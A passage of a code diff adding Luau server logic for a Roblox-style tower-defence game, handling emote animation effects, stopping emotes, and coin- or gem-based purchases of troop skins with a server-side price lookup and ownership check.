+				emote = asset("Emotes", n)
+			end))
+			newmaid:Mark(anim:GetMarkerReachedSignal("Event"):Connect(function(name)
+				if emote then
+					local effects: any = emote.Effects
+					if effects then
+						local fx = effects[name]
+						if fx then
+							fx(newmaid, parent, anim)
+						end
+					end
+				end
+			end))
+			anim.Stopped:Wait()
+			newmaid:Sweep()
+		end))
+	end
+end)
+
+emoss:On("Stop", function(player)
+	if efx[player] then
+		if efx[player].Connections == nil then return end
+		efx[player].Connections:Sweep()
+		efx[player].Connections = nil
+		for _, v in pairs(efx[player]) do
+			v:Destroy()
+		end
+		table.clear(efx[player])
+		efx[player] = nil
+		emoss:FireClient(player, "Stop")
+	end
+end)
+
+packages:On("Purchase", function(player: any, tower, skin, ptype, price)
+	local pd = data[player.UserId]
+	if not pd.Inventory.Troops[tower].Purchased then
+		return false
+	end
+	if ptype == "Coins" and pd.Inventory.Troops[tower].Purchased then
+		local coin = pd.Stats.Coins
+		if price <= 0 or player.Coins.Value <= 0 or coin <= 0 then
+			return false
+		end
+
+		local func = script.Parent.dailyidk.Function:Invoke()
+		local canbuy = false
+		local shopdata = nil
+
+		for i, v in pairs(func.Coins) do
+			if v.Troop == tower and v.Skin == skin then
+				canbuy = true
+				shopdata = v
+				break
+			end
+		end
+
+		if not canbuy or not shopdata then
+			return false
+		end
+
+		price = shopdata.Price or 100
+
+		if player.Coins.Value >= price and not table.find(pd.Inventory.Skins[tower], skin) then
+			pd.Stats.Coins -= price
+			player.Coins.Value -= price
+			table.insert(pd.Inventory.Skins[tower], skin)
+			session:FireClient(player, "Update", "Inventory.Skins", pd.Inventory.Skins)
+			return true
+		end
+
+	elseif ptype == "Robux" and pd.Inventory.Troops[tower].Purchased then
+		if price <= 0 or player.Gems.Value <= 0 or pd.Stats.Gems <= 0 then
+			return false
+		end
+
+		local func = script.Parent.dailyidk.Function:Invoke()
+		local canbuy = false
+		local shopdata = nil
+
+		for i, v in pairs(func.Robux) do
+			if v.Troop == tower and v.Skin == skin then
+				canbuy = true
+				shopdata = v
+				break
+			end
+		end
+
+		if not canbuy or not shopdata then
+			return false
+		end
+
+		price = shopdata.Price or 100
+
+		if player.Gems.Value >= price and not table.find(pd.Inventory.Skins[tower], skin) then
+			pd.Stats.Gems -= price
+			player.Gems.Value -= price
+			table.insert(pd.Inventory.Skins[tower], skin)
+			session:FireClient(player, "Update", "Inventory.Skins", pd.Inventory.Skins)
+			return true
+		end
+	end
+
+	return false
+end)
+
+packages:On("Owns", function(player: any, tower, skin)
+	local pd = data[player.UserId]
+	if pd.Inventory.Skins[tower] and table.find(pd.Inventory.Skins[tower], skin) then
+		return true
+	end
+	return false
+end)
